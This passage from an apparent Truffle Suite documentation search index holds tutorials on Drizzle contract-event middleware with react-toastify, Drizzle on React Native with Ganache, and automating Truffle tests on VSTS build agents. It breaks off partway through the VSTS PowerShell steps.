synchronizing contract state with a user interface, but as dapps grow in complexity we foresee growing demand for coordination with off-chain services. The code in this section may be small, but it opens up a powerful mechanism to enable that coordination. Imagine your dapp needs to send a message whenever a contract event is generated. Lets see how to make this happen. This tutorial demonstrates how to use Drizzle to subscribe to smart contract events. The finished dapp. We'll use react-toastify to alert the user whenever a SimpleStorage contract event is emitted. We have to declare a component and invoke toast.success() when an event is detected. We'll touch MyComponent and the event reducer respectively. A Complete example is available at the following repo . Prerequisite : You should be familiar with Truffle, Drizzle, React and Redux. If you need an introduction please consult the following resources: Truffle Quickstart Getting Started with Drizzle and React Tutorial: Intro to React Redux Basic Tutorial Redux Saga Redux Middleware","title":"Drizzle and Contract Events"},{"location":"guides/drizzle-and-contract-events/index.html#unbox-drizzle","text":"Let's use truffle unbox to bootstrap a project and then wire up a contract event to a display component by creating a reducer and hook it up to Drizzle's EVENT_FIRED action. Note : More Drizzle actions are listed in our Drizzle Actions documentation . First create an empty directory, navigate to it, and unbox Drizzle. // In the project directory... $ truffle unbox drizzle Now let's start the truffle develop console (which runs a Ganache test blockchain in the background): $ truffle develop Finally, in our Truffle develop console, let's compile and migrate our smart contracts. truffle ( develop ) > compile # some output here... truffle ( develop ) > migrate Now that we have a test chain running and our smart contracts deployed, let's add a toast notification to the UI.","title":"Unbox Drizzle"},{"location":"guides/drizzle-and-contract-events/index.html#listen-for-contract-events","text":"We want to listen for the SimpleStorage contract's StorageSet event and show a toast notification once it fires. The front end code is located under the app folder. Lets add the notification library react-toastify to simulate an external interaction. $ cd app $ npm install react-toastify For the sake of simplicity, we will work in one file, ./app/src/middleware/index.js . $ mkdir ./src/middleware $ touch ./src/middleware/index.js Import EventActions and generateStore from Drizzle as well as toast from react-toastify , and drizzleOptions . // ./app/middleware/index.js import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' The action EventActions.EVENT_FIRED is emitted whenever a contract event is detected in a Block. We will gain access to it by registering a custom middleware with the Redux store. As you know, Redux middleware comprises a set of functions executed in a sequence that processes each dispatched actions before passing them to Reducers. const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } Now lets register this middleware with Drizzle. generateStore will return a Redux store that you can use anywhere you can use a store. We will export it to be used by DrizzleProvider . const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! })","title":"Listen for Contract Events"},{"location":"guides/drizzle-and-contract-events/index.html#connect-the-store","text":"Send the store as a prop to DrizzleProvider // App.js ... import store from './middleware' ... const drizzle = new Drizzle ( drizzleOptions , store ); ...","title":"Connect the Store"},{"location":"guides/drizzle-and-contract-events/index.html#hook-up-display","text":"Modify MyComponent.js to import ReactToastify.css and configure ToastContainer ... import { ToastContainer } from 'react-toastify' import 'react-toastify/dist/ReactToastify.css' ... export default ({ accounts }) => ( < div className = \"App\" > < ToastContainer /> ... < /div>","title":"Hook up Display"},{"location":"guides/drizzle-and-contract-events/index.html#a-quick-test","text":"Things often go south during development so a pretest check is in order. MetaMask should NOT be on Main net! Do not run this if you're on main net! Is MetaMask listening on the correct port defined above? Metamask should have ETH funds. Something is amiss if it doesn't. Are the smart contracts deployed from the correct directory? Fire up the app. $ npm run start Change SimpleStorage's stored Value You'll be rewarded with a toast notification when the transaction is completed. The dapp is now a consumer of Drizzle's EVENT_FIRED action item and can coordinate with other services to implement its business logic. More Drizzle actions are listed in our Drizzle Actions documentation .","title":"A Quick Test"},{"location":"guides/drizzle-and-react-native/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Starting with Drizzle v1.3, we are very happy to announce official support for React Native (^0.57.7)! This tutorial will guide you through how to get Drizzle and Truffle running on your React Native dapps. This tutorial assumes some prior knowledge about Truffle, Drizzle, and React Native, so if you haven't already, go over the following tutorials first to set up your development environment: Getting started with Drizzle and React React Native Make sure to select Building Projects with Native Code since we will be leveraging some native code. This tutorial will cover the following: Setting up the folder structure Shimming web and node libraries on React Native Setting up the smart contract Connecting your app to your Ganache testnet Setting up Drizzle Wiring up the app component Writing a component to read from Drizzle Writing a component to write to the smart contract Setting up the folder structure \u00b6 Truffle \u00b6 Truffle requires an empty folder to start, so let's initialize it first before our React Native project: mkdir truffle-temp cd truffle-temp truffle init You should have the following inside the project folder: \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js React Native \u00b6 Initialize your React Native project in its own folder, as a sibling folder of your Truffle project truffle-temp : react-native init DrizzleReactNativeTutorial React Native and Truffle folders should be in root since React Native doesn't allow you to use symlinks yet, and cannot import from files outside the React Native project folder. Copy all the files in truffle-temp into the root folder of your React Native project. Your folder should look like this in the end: \u251c\u2500\u2500 android \u251c\u2500\u2500 contracts \u251c\u2500\u2500 ios \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 test \u251c\u2500\u2500 App.js \u251c\u2500\u2500 app.json \u251c\u2500\u2500 index.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 truffle.js \u2514\u2500\u2500 yarn.lock Shimming web and node libraries on React Native \u00b6 React Native is missing some of the global objects that are available on other platforms such as the web or Node. We will have to provide our own (i.e. a shim) through imported libraries or in some cases our own code. Install node-libs-react-native , vm-browserify , Base64 , and react-native-randombytes : yarn add node-libs-react-native vm-browserify Base64 react-native-randombytes Link the native libraries in react-native-randombytes : react-native link react-native-randombytes Create a new file shims.js in the root folder with the following code: import \"node-libs-react-native/globals\" ; import { btoa } from \"Base64\" ; import nodeUrl from 'url' ; global . btoa = btoa ; global . URL = class URL { constructor ( url ) { return nodeUrl . parse ( url ) } } /** * From https://github.com/facebook/react-native/blob/1151c096dab17e5d9a6ac05b61aacecd4305f3db/Libraries/polyfills/Object.es6.js * This on RN's master branch as of Sep 11, 2018, however it has not made it into a release yet. * * The only modification made in Truffle's polyfill was to remove the check for an existing implementation. * RN 0.57.7 (and below I assume) uses the non-spec compliant Object.assign that breaks in dev RN builds * https://github.com/facebook/react-native/issues/16814 */ Object . defineProperty ( Object , 'assign' , { value : function assign ( target , varArgs ) { 'use strict' ; if ( target == null ) { throw new TypeError ( 'Cannot convert undefined or null to object' ); } let to = Object ( target ); for ( let index = 1 ; index < arguments . length ; index ++ ) { let nextSource = arguments [ index ]; if ( nextSource != null ) { for ( let nextKey in nextSource ) { if ( Object . prototype . hasOwnProperty . call ( nextSource , nextKey )) { to [ nextKey ] = nextSource [ nextKey ]; } } } } return to ; }, writable : true , configurable : true , }); Create a new file rn-cli.config.js in the root folder with the following code: const nodeLibs = require ( \"node-libs-react-native\" ); nodeLibs . vm = require . resolve ( \"vm-browserify\" ); module . exports = { resolver : { extraNodeModules : nodeLibs }, serializer : { // From https://github.com/facebook/react-native/blob/v0.57.7/rn-get-polyfills.js getPolyfills : () => [ /** * We omit RN's Object.assign polyfill * If we don't, then node_modules will be using RN's polyfill rather than ours. */ // require.resolve('react-native/Libraries/polyfills/Object.es6.js'), require . resolve ( 'react-native/Libraries/polyfills/console.js' ), require . resolve ( 'react-native/Libraries/polyfills/error-guard.js' ), require . resolve ( 'react-native/Libraries/polyfills/Number.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/String.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Object.es7.js' ), ] } }; If you're wondering why we did all that in rn-cli.config.js , refer to this Gist for a great explanation. Finally let's import our shims in index.js . The very first line should be the following: import \"./shims\" We're now done with replacing all the global objects and functions that Drizzle was expecting. Setting up the smart contract \u00b6 To add our smart contract we'll just follow the previous tutorial on Drizzle and React. Do the steps from Writing our smart contract up to (and including) Migration . Connecting your app to your Ganache testnet \u00b6 When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator. Running the app \u00b6 Start React Native Metro bundler: react-native start Start your emulator/plug in your device Android (Emulator/Physical Device) \u00b6 The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android iOS \u00b6 Simulator \u00b6 The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode) Physical device \u00b6 iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode Setting up Drizzle \u00b6 Install Drizzle: yarn add drizzle Set up the Drizzle store by adding the following code to index.js : import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Your index.js should look like this in the end: /** @format */ import \"./shims\" ; import { AppRegistry } from \"react-native\" ; import App from \"./app/App\" ; import { name as appName } from \"./app.json\" ; import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Wiring up the App component \u00b6 This is pretty much the same as the web tutorial , but with React Native components instead of web ones. Refer to the web tutorial for a more in-depth explanation of what's going on. Let's create a folder called app in the root of the project. Add a file called App.js to it. In app/App.js , your code should look like this in the end: /** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow */ import React , { Component } from \"react\" ; import { Platform , StyleSheet , Text , View } from \"react-native\" ; type Props = {}; export default class App extends Component < Props > { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; this . unsubscribe = drizzle . store . subscribe (() => { const drizzleState = drizzle . store . getState (); if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading Drizzle ... < /Text> ) : ( < View > < Text > Drizzle is ready < /Text> < /View> )} < /View> ); } } const styles = StyleSheet . create ({ container : { flex : 1 , justifyContent : \"center\" , alignItems : \"center\" , backgroundColor : \"#F5FCFF\" } }); Run the app, and you should see the string Loading Drizzle... while you wait for Drizzle to initialize. Once initialization is complete, the string Drizzle is ready should be visible. Writing a component to read from Drizzle \u00b6 Once again, this is very similar to the web tutorial , just with React Native components. Add ReadString.js to the folder app . app/ReadString.js should look like this: import React from \"react\" ; import { Text } from \"react-native\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < Text > My stored string : { myString && myString . value } < /Text>; } } export default ReadString ; Add it to App.js by modifying the render method: import ReadString from \"./ReadString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } You should now see the string Hello World being rendered after Drizzle has finished loading. Writing a component to write to the smart contract \u00b6 Once again, this is very similar to the web tutorial , just with React Native components. Add SetString.js to the folder app . app/SetString.js should look like this: import React from \"react\" ; import { Text , View , Button , TextInput , StyleSheet } from \"react-native\" ; class SetString extends React . Component { state = { stackId : null , text : \"\" }; submit = () => { this . setValue ( this . state . text ); }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status if ( transactions [ txHash ] && transactions [ txHash ]. status ) return `Transaction status: ${ transactions [ txHash ]. status } ` ; return null ; }; render () { return ( < View > < TextInput style = { styles . input } onChangeText = { text => this . setState ({ text })} value = { this . state . text } placeholder = \"Enter some text\" /> < Button title = \"Submit\" onPress = { this . submit } /> < Text > { this . getTxStatus ()} < /Text> < /View> ); } } const styles = StyleSheet . create ({ input : { height : 40 , borderColor : \"gray\" , borderWidth : 1 } }); export default SetString ; Add it to App.js by modifying the render function import ReadString from \"./ReadString\" ; import SetString from \"./SetString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } Run the app, enter a new string, and press the Submit button. A transaction status of pending will show and change to success on completion. This string will persist through reloads of the app since it is connected to your Ganache testnet. The Finish Line \u00b6 Congratulations, you've just successfully integrated the full suite of Drizzle, Truffle, and Ganache tooling into your React Native dapp!","title":"Truffle Suite"},{"location":"guides/drizzle-and-react-native/index.html#setting-up-the-folder-structure","text":"","title":"Setting up the folder structure"},{"location":"guides/drizzle-and-react-native/index.html#truffle","text":"Truffle requires an empty folder to start, so let's initialize it first before our React Native project: mkdir truffle-temp cd truffle-temp truffle init You should have the following inside the project folder: \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js","title":"Truffle"},{"location":"guides/drizzle-and-react-native/index.html#react-native","text":"Initialize your React Native project in its own folder, as a sibling folder of your Truffle project truffle-temp : react-native init DrizzleReactNativeTutorial React Native and Truffle folders should be in root since React Native doesn't allow you to use symlinks yet, and cannot import from files outside the React Native project folder. Copy all the files in truffle-temp into the root folder of your React Native project. Your folder should look like this in the end: \u251c\u2500\u2500 android \u251c\u2500\u2500 contracts \u251c\u2500\u2500 ios \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 test \u251c\u2500\u2500 App.js \u251c\u2500\u2500 app.json \u251c\u2500\u2500 index.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 truffle.js \u2514\u2500\u2500 yarn.lock","title":"React Native"},{"location":"guides/drizzle-and-react-native/index.html#shimming-web-and-node-libraries-on-react-native","text":"React Native is missing some of the global objects that are available on other platforms such as the web or Node. We will have to provide our own (i.e. a shim) through imported libraries or in some cases our own code. Install node-libs-react-native , vm-browserify , Base64 , and react-native-randombytes : yarn add node-libs-react-native vm-browserify Base64 react-native-randombytes Link the native libraries in react-native-randombytes : react-native link react-native-randombytes Create a new file shims.js in the root folder with the following code: import \"node-libs-react-native/globals\" ; import { btoa } from \"Base64\" ; import nodeUrl from 'url' ; global . btoa = btoa ; global . URL = class URL { constructor ( url ) { return nodeUrl . parse ( url ) } } /** * From https://github.com/facebook/react-native/blob/1151c096dab17e5d9a6ac05b61aacecd4305f3db/Libraries/polyfills/Object.es6.js * This on RN's master branch as of Sep 11, 2018, however it has not made it into a release yet. * * The only modification made in Truffle's polyfill was to remove the check for an existing implementation. * RN 0.57.7 (and below I assume) uses the non-spec compliant Object.assign that breaks in dev RN builds * https://github.com/facebook/react-native/issues/16814 */ Object . defineProperty ( Object , 'assign' , { value : function assign ( target , varArgs ) { 'use strict' ; if ( target == null ) { throw new TypeError ( 'Cannot convert undefined or null to object' ); } let to = Object ( target ); for ( let index = 1 ; index < arguments . length ; index ++ ) { let nextSource = arguments [ index ]; if ( nextSource != null ) { for ( let nextKey in nextSource ) { if ( Object . prototype . hasOwnProperty . call ( nextSource , nextKey )) { to [ nextKey ] = nextSource [ nextKey ]; } } } } return to ; }, writable : true , configurable : true , }); Create a new file rn-cli.config.js in the root folder with the following code: const nodeLibs = require ( \"node-libs-react-native\" ); nodeLibs . vm = require . resolve ( \"vm-browserify\" ); module . exports = { resolver : { extraNodeModules : nodeLibs }, serializer : { // From https://github.com/facebook/react-native/blob/v0.57.7/rn-get-polyfills.js getPolyfills : () => [ /** * We omit RN's Object.assign polyfill * If we don't, then node_modules will be using RN's polyfill rather than ours. */ // require.resolve('react-native/Libraries/polyfills/Object.es6.js'), require . resolve ( 'react-native/Libraries/polyfills/console.js' ), require . resolve ( 'react-native/Libraries/polyfills/error-guard.js' ), require . resolve ( 'react-native/Libraries/polyfills/Number.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/String.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Object.es7.js' ), ] } }; If you're wondering why we did all that in rn-cli.config.js , refer to this Gist for a great explanation. Finally let's import our shims in index.js . The very first line should be the following: import \"./shims\" We're now done with replacing all the global objects and functions that Drizzle was expecting.","title":"Shimming web and node libraries on React Native"},{"location":"guides/drizzle-and-react-native/index.html#setting-up-the-smart-contract","text":"To add our smart contract we'll just follow the previous tutorial on Drizzle and React. Do the steps from Writing our smart contract up to (and including) Migration .","title":"Setting up the smart contract"},{"location":"guides/drizzle-and-react-native/index.html#connecting-your-app-to-your-ganache-testnet","text":"When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator.","title":"Connecting your app to your Ganache testnet"},{"location":"guides/drizzle-and-react-native/index.html#running-the-app","text":"Start React Native Metro bundler: react-native start Start your emulator/plug in your device","title":"Running the app"},{"location":"guides/drizzle-and-react-native/index.html#android-emulatorphysical-device","text":"The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android","title":"Android (Emulator/Physical Device)"},{"location":"guides/drizzle-and-react-native/index.html#ios","text":"","title":"iOS"},{"location":"guides/drizzle-and-react-native/index.html#simulator","text":"The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode)","title":"Simulator"},{"location":"guides/drizzle-and-react-native/index.html#physical-device","text":"iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode","title":"Physical device"},{"location":"guides/drizzle-and-react-native/index.html#setting-up-drizzle","text":"Install Drizzle: yarn add drizzle Set up the Drizzle store by adding the following code to index.js : import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Your index.js should look like this in the end: /** @format */ import \"./shims\" ; import { AppRegistry } from \"react-native\" ; import App from \"./app/App\" ; import { name as appName } from \"./app.json\" ; import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> );","title":"Setting up Drizzle"},{"location":"guides/drizzle-and-react-native/index.html#wiring-up-the-app-component","text":"This is pretty much the same as the web tutorial , but with React Native components instead of web ones. Refer to the web tutorial for a more in-depth explanation of what's going on. Let's create a folder called app in the root of the project. Add a file called App.js to it. In app/App.js , your code should look like this in the end: /** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow */ import React , { Component } from \"react\" ; import { Platform , StyleSheet , Text , View } from \"react-native\" ; type Props = {}; export default class App extends Component < Props > { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; this . unsubscribe = drizzle . store . subscribe (() => { const drizzleState = drizzle . store . getState (); if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading Drizzle ... < /Text> ) : ( < View > < Text > Drizzle is ready < /Text> < /View> )} < /View> ); } } const styles = StyleSheet . create ({ container : { flex : 1 , justifyContent : \"center\" , alignItems : \"center\" , backgroundColor : \"#F5FCFF\" } }); Run the app, and you should see the string Loading Drizzle... while you wait for Drizzle to initialize. Once initialization is complete, the string Drizzle is ready should be visible.","title":"Wiring up the App component"},{"location":"guides/drizzle-and-react-native/index.html#writing-a-component-to-read-from-drizzle","text":"Once again, this is very similar to the web tutorial , just with React Native components. Add ReadString.js to the folder app . app/ReadString.js should look like this: import React from \"react\" ; import { Text } from \"react-native\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < Text > My stored string : { myString && myString . value } < /Text>; } } export default ReadString ; Add it to App.js by modifying the render method: import ReadString from \"./ReadString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } You should now see the string Hello World being rendered after Drizzle has finished loading.","title":"Writing a component to read from Drizzle"},{"location":"guides/drizzle-and-react-native/index.html#writing-a-component-to-write-to-the-smart-contract","text":"Once again, this is very similar to the web tutorial , just with React Native components. Add SetString.js to the folder app . app/SetString.js should look like this: import React from \"react\" ; import { Text , View , Button , TextInput , StyleSheet } from \"react-native\" ; class SetString extends React . Component { state = { stackId : null , text : \"\" }; submit = () => { this . setValue ( this . state . text ); }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status if ( transactions [ txHash ] && transactions [ txHash ]. status ) return `Transaction status: ${ transactions [ txHash ]. status } ` ; return null ; }; render () { return ( < View > < TextInput style = { styles . input } onChangeText = { text => this . setState ({ text })} value = { this . state . text } placeholder = \"Enter some text\" /> < Button title = \"Submit\" onPress = { this . submit } /> < Text > { this . getTxStatus ()} < /Text> < /View> ); } } const styles = StyleSheet . create ({ input : { height : 40 , borderColor : \"gray\" , borderWidth : 1 } }); export default SetString ; Add it to App.js by modifying the render function import ReadString from \"./ReadString\" ; import SetString from \"./SetString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } Run the app, enter a new string, and press the Submit button. A transaction status of pending will show and change to success on completion. This string will persist through reloads of the app since it is connected to your Ganache testnet.","title":"Writing a component to write to the smart contract"},{"location":"guides/drizzle-and-react-native/index.html#the-finish-line","text":"Congratulations, you've just successfully integrated the full suite of Drizzle, Truffle, and Ganache tooling into your React Native dapp!","title":"The Finish Line"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! I have been working on automating the compilation and testing of Ethereum solidity contracts, via the use of Truffle . I\u2019ve got the test results being published back into the portal, allowing me to see on each commit if my code still compiles and passes my tests. I\u2019m assuming you already have a Truffle project locally that you want to automate the continuous builds & testing on. Follow the tutorial on installing Truffle & TestRPC on Windows . My final system will allow you to run \u201ctruffle test\u201d locally to see standard test output, but will modify the test runner on the server to output it as JUnit format. The Build system \u00b6 The system uses the Visual Studio Team Services (VSTS) build engine to automate this. You can sign up for free, and get unlimited private Git repos. You can have the code hosted on any Git provider. So either within VSTS itself, or GitHub, BitBucket, etc. Prepare truffle.js \u00b6 A pre-step is to define the test section in the truffle.js file mocha : { reporter : \u201c spec \u201d , reporterOptions : { mochaFile : \u2018 junitresults . xml \u2019 } } Create a build agent \u00b6 VSTS does provide hosted build agents, which are generic and can build standard .Net projects, Xamarin, etc. But because we are going to use npm packages installed globally on the box to handle the Truffle builds Create a new Windows VM (Can be your own hosted server, or Azure). e.g. Windows Server 2016 Datacentre edition on Azure Install the VSTS build agent. Instructions at https://www.visualstudio.com/en-us/docs/build/admin/agents/v2-windows Note: DON\u2019T select to run service as NT AUTHORITY\\NETWORK, this will not work with TestRPC (needs to open ports). Run the service as another user, or NT AUTHORITY\\SYSTEM Install chocolatey https://chocolatey.org/install Install these chocolatey packages $ choco install git -y $ choco install nodejs.install \u2013y Install npm packages (make sure you open a new PowerShell window so that node is in your path) $ npm install -g npm $ npm install -g \u2013production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle $ npm install -g mocha $ npm install -g mocha-junit-reporter Restart the build agent so that all new paths are working Configure VSTS build \u00b6 Create a new variable with the path to where the npm global path is, for the user you installed the npm packages on above: variable name: npm.path variable value: path to npm packages e.g. C:\\Users\\<user>\\AppData\\Roaming\\npm Add 7 PowerShell tasks, and configure them like this \u00b6 Name: System version information Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path npm config set prefix $env:npm_path #only needs to be set once, will update for user #DEBUG #$env:path #npm list -g \u2013depth=0 #Display system information Write-Host \u201c System version information \u201d Write-Host -nonewline \u201c node version : \u201d ; node -v Write-Host -nonewline \u201c npm version : \u201c ; npm -v Write-Host -nonewline \u201c npm prefix : \u201c ; npm prefix -g Write-Host -nonewline \u201c truffle : \u201d ; truffle version Name: Config transform & test clean Script: # remove old test results rm .\\ junitresults . xml -ea SilentlyContinue # Modify the Truffle test runner to use the JUnit reporter Rename-Item .\\ truffle . js .\\ truffle_temp . js cat .\\ truffle_temp . js | % { $_ -replace \u2018 reporter : \u201c spec \u201d\u2018 , \u2018 reporter : \u201c mocha-junit-reporter \u201d\u2018 } | Out-File -Encoding ASCII .\\ truffle . js rm .\\ truffle_temp . js Name: Truffle build Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path #Truffle build truffle compile Name: Launch TestRPC Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # launch the process echo \u201c launching TestRPC \u201d $testrpcProcess = Start-Process testrpc -passthru # persist the PID to disk and display in logs $testrpcProcess . Id | Export-CliXml testrpcPID . xml cat testrpcPID . xml Name: Run Truffle tests Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # Run the tests truffle test Name: Shutdown TestRPC Other Settings: Enable \u201cAlways Run\u201d (to make sure it is shutdown if there is an error) Script: #Setting environment 